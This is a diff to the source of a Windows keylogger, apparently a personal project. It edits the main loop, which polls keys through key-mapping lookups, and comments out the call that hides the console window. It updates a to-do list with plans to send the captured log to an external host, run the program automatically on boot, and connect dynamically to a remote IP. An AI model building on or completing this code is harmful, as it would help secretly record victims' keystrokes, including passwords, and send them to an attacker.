@@ -36,7 +36,7 @@ void writeKeyStroke(int trueKey)
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     PSTR lpCmdLine, int nCmdShow)
 {
-    FreeConsole();
+    //FreeConsole();
     Maps vkMaps;
     vkMaps.initializeMaps();
     while (1)
@@ -54,7 +54,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                 }
                 else if (vkMaps.searchMiscMaps(i) != 1) 
                 {
-                    key = 0;
+                    // null statement as there is no code logic required here.
+                    ;
                 }
                 else if (vkMaps.searchAsciiMaps(i) != 1) 
                 {
@@ -74,9 +75,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 /*
     To-Do list
 
-    ~ consider writing some code to send logs.txt over the internet to an external host?
-
-    Ideas
-
-    ~ write code to make it create a task that runs on startup. 
+    ~ write client network code to send to an external host. 
+    ~ write code to autonomously create a task to run this program on system boot.
+    ~ think about how i can seemlessly get my keylogger to connect to an ip address dynamically.
 */
